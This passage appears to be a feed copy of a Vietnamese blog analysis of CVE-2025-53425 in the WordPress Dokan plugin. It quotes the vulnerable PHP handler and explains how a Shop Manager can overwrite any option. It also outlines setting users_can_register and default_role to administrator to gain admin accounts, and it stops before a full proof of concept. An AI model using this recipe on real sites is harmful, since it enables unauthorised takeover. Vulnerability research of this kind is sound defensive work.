      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;Gán Quyền Không Chính Xác&lt;/strong&gt; (&lt;strong&gt;Incorrect Privilege Assignment&lt;/strong&gt;) trong &lt;strong&gt;Dokan, Inc. Dokan dokan-lite&lt;/strong&gt; cho phép &lt;strong&gt;Leo Thang Đặc Quyền&lt;/strong&gt; (&lt;strong&gt;Privilege Escalation&lt;/strong&gt;). Vấn đề này ảnh hưởng đến &lt;strong&gt;Dokan&lt;/strong&gt; từ &lt;strong&gt;n/a&lt;/strong&gt; đến &lt;strong&gt;&amp;lt;= 4.1.2&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53425&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53425&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.1.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.1.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (7.2)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Shop manager&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/dokan-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Dokan Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Dokan&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.3&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.1.4&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;WooCommerce Plugin&lt;/strong&gt; → &lt;a href=&#34;https://wordpress.org/plugins/woocommerce/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;WooCommerce&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi chú&lt;/p&gt;&lt;p&gt;Plugin &lt;strong&gt;cần WooCommerce để hoạt động&lt;/strong&gt;, vì nó &lt;strong&gt;tích hợp và hoạt động trực tiếp với WooCommerce&lt;/strong&gt; nhằm quản lý &lt;strong&gt;sản phẩm, đơn hàng và quy trình thanh toán&lt;/strong&gt; một cách đầy đủ và hiệu quả.&lt;/p&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_dokan_save_settings&amp;#39;, [ $this, &amp;#39;save_settings_value&amp;#39; ], 10 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_&lt;/code&gt; là hook dành cho người dùng &lt;strong&gt;đã đăng nhập&lt;/strong&gt;.&#xA;Khi có request đến endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với param &lt;code&gt;action=dokan_save_settings&lt;/code&gt; thì callback &lt;code&gt;save_settings_value&lt;/code&gt; sẽ được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function save_settings_value() {&#xA;    try {&#xA;        if ( ! current_user_can( &amp;#39;manage_woocommerce&amp;#39; ) ) {&#xA;            throw new DokanException( &amp;#39;dokan_settings_unauthorized_operation&amp;#39;, __( &amp;#39;You are not authorized to perform this action.&amp;#39;, &amp;#39;dokan-lite&amp;#39; ), 401 );&#xA;        }&#xA;&#xA;        if ( ! isset( $_POST[&amp;#39;nonce&amp;#39;] ) || ! wp_verify_nonce( sanitize_key( wp_unslash( $_POST[&amp;#39;nonce&amp;#39;] ) ), &amp;#39;dokan_admin&amp;#39; ) ) {&#xA;            throw new DokanException( &amp;#39;dokan_settings_invalid_nonce&amp;#39;, __( &amp;#39;Invalid nonce&amp;#39;, &amp;#39;dokan-lite&amp;#39; ), 403 );&#xA;        }&#xA;&#xA;        if ( empty( $_POST[&amp;#39;section&amp;#39;] ) ) {&#xA;            throw new DokanException( &amp;#39;dokan_settings_error_saving&amp;#39;, __( &amp;#39;`section` parameter is required.&amp;#39;, &amp;#39;dokan-lite&amp;#39; ), 400 );&#xA;        }&#xA;&#xA;        $option_name  = sanitize_text_field( wp_unslash( $_POST[&amp;#39;section&amp;#39;] ) );&#xA;        $option_value = $this-&amp;gt;sanitize_options( wp_unslash( $_POST[&amp;#39;settingsData&amp;#39;] ), &amp;#39;edit&amp;#39; ); // phpcs:ignore&#xA;        $option_value = apply_filters( &amp;#39;dokan_save_settings_value&amp;#39;, $option_value, $option_name );&#xA;        $old_options  = get_option( $option_name, [] );&#xA;&#xA;        /**&#xA;         * @since 3.5.1 added $old_options parameter&#xA;         */&#xA;        do_action( &amp;#39;dokan_before_saving_settings&amp;#39;, $option_name, $option_value, $old_options );&#xA;&#xA;        update_option( $option_name, $option_value );&#xA;&#xA;        /**&#xA;         * @since 3.5.1 added $old_options parameter&#xA;         */&#xA;        do_action( &amp;#39;dokan_after_saving_settings&amp;#39;, $option_name, $option_value, $old_options );&#xA;&#xA;        // only flush rewrite rules if store url has been changed&#xA;        if ( &amp;#39;dokan_general&amp;#39; === $option_name &amp;amp;&amp;amp; isset( $old_options[&amp;#39;custom_store_url&amp;#39;] ) &amp;amp;&amp;amp; $old_options[&amp;#39;custom_store_url&amp;#39;] !== $option_value[&amp;#39;custom_store_url&amp;#39;] ) {&#xA;            dokan()-&amp;gt;rewrite-&amp;gt;register_rule();&#xA;            flush_rewrite_rules();&#xA;        }&#xA;&#xA;        wp_send_json_success(&#xA;            [&#xA;                &amp;#39;settings&amp;#39; =&amp;gt; [&#xA;                    &amp;#39;name&amp;#39;  =&amp;gt; $option_name,&#xA;                    &amp;#39;value&amp;#39; =&amp;gt; apply_filters( &amp;#39;dokan_get_settings_values&amp;#39;, $this-&amp;gt;sanitize_options( $option_value, &amp;#39;read&amp;#39; ), $option_name ),&#xA;                ],&#xA;                &amp;#39;message&amp;#39;  =&amp;gt; __( &amp;#39;Setting has been saved successfully.&amp;#39;, &amp;#39;dokan-lite&amp;#39; ),&#xA;            ]&#xA;        );&#xA;    } catch ( Exception $e ) {&#xA;        $error_code = $e-&amp;gt;getCode() ? $e-&amp;gt;getCode() : 422;&#xA;&#xA;        wp_send_json_error( new WP_Error( &amp;#39;dokan_settings_error&amp;#39;, $e-&amp;gt;getMessage() ), $error_code );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm thực hiện kiểm tra quyền người dùng bằng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;current_user_can( &amp;#39;manage_woocommerce&amp;#39; )&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong đó, &lt;code&gt;manage_woocommerce&lt;/code&gt; là một &lt;strong&gt;capability&lt;/strong&gt; được đăng ký bởi plugin &lt;strong&gt;WooCommerce&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Quyền này được khai báo trong hàm &lt;code&gt;get_core_capabilities()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_core_capabilities() {&#xA;    $capabilities = array();&#xA;&#xA;    $capabilities[&amp;#39;core&amp;#39;] = array(&#xA;        &amp;#39;manage_woocommerce&amp;#39;,&#xA;        &amp;#39;create_customers&amp;#39;,&#xA;        &amp;#39;view_woocommerce_reports&amp;#39;,&#xA;    );&#xA;&#xA;    $capability_types = array( &amp;#39;product&amp;#39;, &amp;#39;shop_order&amp;#39;, &amp;#39;shop_coupon&amp;#39; );&#xA;&#xA;    foreach ( $capability_types as $capability_type ) {&#xA;&#xA;        $capabilities[ $capability_type ] = array(&#xA;            // Post type.&#xA;            &amp;#34;edit_{$capability_type}&amp;#34;,&#xA;            &amp;#34;read_{$capability_type}&amp;#34;,&#xA;            &amp;#34;delete_{$capability_type}&amp;#34;,&#xA;            &amp;#34;edit_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;edit_others_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;publish_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;read_private_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;delete_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;delete_private_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;delete_published_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;delete_others_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;edit_private_{$capability_type}s&amp;#34;,&#xA;            &amp;#34;edit_published_{$capability_type}s&amp;#34;,&#xA;&#xA;            // Terms.&#xA;            &amp;#34;manage_{$capability_type}_terms&amp;#34;,&#xA;            &amp;#34;edit_{$capability_type}_terms&amp;#34;,&#xA;            &amp;#34;delete_{$capability_type}_terms&amp;#34;,&#xA;            &amp;#34;assign_{$capability_type}_terms&amp;#34;,&#xA;        );&#xA;    }&#xA;&#xA;    return $capabilities;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này định nghĩa &lt;strong&gt;các quyền cốt lõi của WooCommerce&lt;/strong&gt;, trong đó nhóm &lt;code&gt;core&lt;/code&gt; bao gồm các quyền quan trọng như:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;manage_woocommerce&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;create_customers&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;view_woocommerce_reports&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Các quyền này sau đó được sử dụng trong hàm &lt;code&gt;create_roles()&lt;/code&gt; để gán cho các vai trò người dùng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function create_roles() {&#xA;    ...&#xA;    // Shop manager role.&#xA;    add_role(&#xA;        &amp;#39;shop_manager&amp;#39;,&#xA;        &amp;#39;Shop manager&amp;#39;,&#xA;        array(&#xA;            &amp;#39;level_9&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_8&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_7&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_6&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_5&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_4&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_3&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_2&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_1&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;level_0&amp;#39;                =&amp;gt; true,&#xA;            &amp;#39;read&amp;#39;                   =&amp;gt; true,&#xA;            &amp;#39;read_private_pages&amp;#39;     =&amp;gt; true,&#xA;            &amp;#39;read_private_posts&amp;#39;     =&amp;gt; true,&#xA;            &amp;#39;edit_posts&amp;#39;             =&amp;gt; true,&#xA;            &amp;#39;edit_pages&amp;#39;             =&amp;gt; true,&#xA;            &amp;#39;edit_published_posts&amp;#39;   =&amp;gt; true,&#xA;            &amp;#39;edit_published_pages&amp;#39;   =&amp;gt; true,&#xA;            &amp;#39;edit_private_pages&amp;#39;     =&amp;gt; true,&#xA;            &amp;#39;edit_private_posts&amp;#39;     =&amp;gt; true,&#xA;            &amp;#39;edit_others_posts&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;edit_others_pages&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;publish_posts&amp;#39;          =&amp;gt; true,&#xA;            &amp;#39;publish_pages&amp;#39;          =&amp;gt; true,&#xA;            &amp;#39;delete_posts&amp;#39;           =&amp;gt; true,&#xA;            &amp;#39;delete_pages&amp;#39;           =&amp;gt; true,&#xA;            &amp;#39;delete_private_pages&amp;#39;   =&amp;gt; true,&#xA;            &amp;#39;delete_private_posts&amp;#39;   =&amp;gt; true,&#xA;            &amp;#39;delete_published_pages&amp;#39; =&amp;gt; true,&#xA;            &amp;#39;delete_published_posts&amp;#39; =&amp;gt; true,&#xA;            &amp;#39;delete_others_posts&amp;#39;    =&amp;gt; true,&#xA;            &amp;#39;delete_others_pages&amp;#39;    =&amp;gt; true,&#xA;            &amp;#39;manage_categories&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;manage_links&amp;#39;           =&amp;gt; true,&#xA;            &amp;#39;moderate_comments&amp;#39;      =&amp;gt; true,&#xA;            &amp;#39;upload_files&amp;#39;           =&amp;gt; true,&#xA;            &amp;#39;export&amp;#39;                 =&amp;gt; true,&#xA;            &amp;#39;import&amp;#39;                 =&amp;gt; true,&#xA;            &amp;#39;list_users&amp;#39;             =&amp;gt; true,&#xA;            &amp;#39;edit_theme_options&amp;#39;     =&amp;gt; true,&#xA;        )&#xA;    );&#xA;&#xA;    $capabilities = self::get_core_capabilities();&#xA;&#xA;    foreach ( $capabilities as $cap_group ) {&#xA;        foreach ( $cap_group as $cap ) {&#xA;            $wp_roles-&amp;gt;add_cap( &amp;#39;shop_manager&amp;#39;, $cap );&#xA;            $wp_roles-&amp;gt;add_cap( &amp;#39;administrator&amp;#39;, $cap );&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này tạo và cấu hình các vai trò người dùng, trong đó &lt;strong&gt;role &lt;code&gt;shop_manager&lt;/code&gt;&lt;/strong&gt; được cấp rất nhiều quyền cao, gần tương đương với &lt;strong&gt;administrator&lt;/strong&gt;, bao gồm:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Quản lý bài viết, trang và bình luận&lt;/li&gt;&#xA;&lt;li&gt;Upload file, import/export&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;edit_theme_options&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Sau đó, &lt;strong&gt;toàn bộ quyền WooCommerce&lt;/strong&gt; được khai báo trong &lt;code&gt;get_core_capabilities()&lt;/code&gt; tiếp tục được gán thêm cho:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;shop_manager&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;administrator&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;$wp_roles-&amp;gt;add_cap( &amp;#39;shop_manager&amp;#39;, $cap );&#xA;$wp_roles-&amp;gt;add_cap( &amp;#39;administrator&amp;#39;, $cap );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều này đồng nghĩa với việc &lt;strong&gt;Shop Manager có quyền &lt;code&gt;manage_woocommerce&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Như vậy, để hàm &lt;code&gt;save_settings_value()&lt;/code&gt; tiếp tục xử lý thì user phải có role &lt;code&gt;Shop manager&lt;/code&gt;, ta có thể tạo user với quyền này trong Admin Dashboard:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/create.png&#34; title=&#34;Create Shop Manager User&#34; data-thumbnail=&#34;/posts/2026-01-04-cve-2025-53425/create.png&#34; data-sub-html=&#34;&lt;h2&gt;Create Shop Manager User&lt;/h2&gt;&lt;p&gt;Create Shop Manager User&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-04-cve-2025-53425/create.png&#39; alt=&#34;Create Shop Manager User&#34; height=&#34;555&#34; width=&#34;1195&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Create Shop Manager User&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Đúng như tên gọi của hàm &lt;code&gt;save_settings_value()&lt;/code&gt;, chức năng của nó là lưu các thiết lập (settings) của Dokan.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/setting.png&#34; title=&#34;Setting của Dokan trong UI&#34; data-thumbnail=&#34;/posts/2026-01-04-cve-2025-53425/setting.png&#34; data-sub-html=&#34;&lt;h2&gt;Setting&lt;/h2&gt;&lt;p&gt;Setting của Dokan trong UI&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-04-cve-2025-53425/setting.png&#39; alt=&#34;Setting&#34; height=&#34;913&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Setting của Dokan trong UI&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tận dụng sức mạnh của &lt;strong&gt;debugger&lt;/strong&gt;, ta đặt &lt;strong&gt;breakpoint&lt;/strong&gt; tại hàm &lt;code&gt;save_settings_value()&lt;/code&gt; và thực hiện thao tác &lt;strong&gt;lưu settings&lt;/strong&gt; từ giao diện quản trị.&lt;/p&gt;&#xA;&lt;p&gt;Nếu debugger hoạt động đúng, &lt;strong&gt;luồng thực thi sẽ dừng lại ngay tại breakpoint&lt;/strong&gt;, xác nhận rằng:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Request lưu settings thực sự đi vào hàm &lt;code&gt;save_settings_value()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Người dùng hiện tại đã &lt;strong&gt;vượt qua kiểm tra quyền &lt;code&gt;manage_woocommerce&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Nonce &lt;code&gt;dokan_admin&lt;/code&gt; là &lt;strong&gt;hợp lệ&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-04-cve-2025-53425/debug.png&#34; title=&#34;Debugger hoạt động&#34; data-thumbnail=&#34;/posts/2026-01-04-cve-2025-53425/debug.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug&lt;/h2&gt;&lt;p&gt;Debugger hoạt động&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-04-cve-2025-53425/debug.png&#39; alt=&#34;Debug&#34; height=&#34;637&#34; width=&#34;1904&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debugger hoạt động&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;=&amp;gt; Điều này cho thấy chức năng lưu settings thực sự có thể được thực thi thành công, và luồng xử lý hoạt động đúng như phân tích ở trên.&lt;/p&gt;&#xA;&lt;p&gt;Đây là điểm máu chốt khiến lõ hổng xảy ra:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$option_name  = sanitize_text_field( wp_unslash( $_POST[&amp;#39;section&amp;#39;] ) );&#xA;$option_value = $this-&amp;gt;sanitize_options( wp_unslash( $_POST[&amp;#39;settingsData&amp;#39;] ), &amp;#39;edit&amp;#39; );&#xA;update_option( $option_name, $option_value );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đoạn mã trên cho phép &lt;strong&gt;dữ liệu từ request được ghi trực tiếp vào &lt;code&gt;wp_options&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Trong đó, &lt;strong&gt;người dùng có thể kiểm soát hoàn toàn &lt;code&gt;$option_name&lt;/code&gt; thông qua tham số &lt;code&gt;section&lt;/code&gt;&lt;/strong&gt;. Mặc dù dữ liệu có được sanitize, nhưng &lt;strong&gt;không hề có cơ chế giới hạn (whitelist) các option được phép cập nhật&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Khi kết hợp với việc &lt;strong&gt;Shop Manager có quyền &lt;code&gt;manage_woocommerce&lt;/code&gt;&lt;/strong&gt;, một role &lt;strong&gt;không phải Administrator&lt;/strong&gt; vẫn có thể:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ghi hoặc ghi đè &lt;strong&gt;bất kỳ option nào&lt;/strong&gt; trong hệ thống&lt;/li&gt;&#xA;&lt;li&gt;Thay đổi &lt;strong&gt;các cấu hình có phạm vi toàn cục của WordPress/Dokan&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Điều này dẫn đến &lt;strong&gt;Privilege Escalation&lt;/strong&gt;, vì người dùng có quyền thấp hơn có thể &lt;strong&gt;thực hiện các hành động vốn chỉ nên dành cho Administrator&lt;/strong&gt;, thông qua việc thao túng các option quan trọng trong database.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi chú&lt;/p&gt;&lt;p&gt;Một kịch bản phổ biến để khai thác lỗ hổng &lt;strong&gt;Privilege Escalation&lt;/strong&gt; thông qua hàm &lt;code&gt;update_option()&lt;/code&gt; là:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Đặt &lt;code&gt;users_can_register = 1&lt;/code&gt; → cho phép người dùng tự đăng ký&lt;/li&gt;&#xA;&lt;li&gt;Đặt &lt;code&gt;default_role = administrator&lt;/code&gt; → người dùng mới được tạo sẽ có quyền Administrator&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Tuy nhiên, trong môi trường sử dụng &lt;strong&gt;WooCommerce&lt;/strong&gt; kết hợp với &lt;strong&gt;Dokan&lt;/strong&gt;, luồng đăng ký người dùng &lt;strong&gt;không sử dụng &lt;code&gt;/register/&lt;/code&gt; mặc định của WordPress&lt;/strong&gt;, mà bắt buộc thông qua endpoint &lt;strong&gt;&lt;code&gt;/my-account/&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; 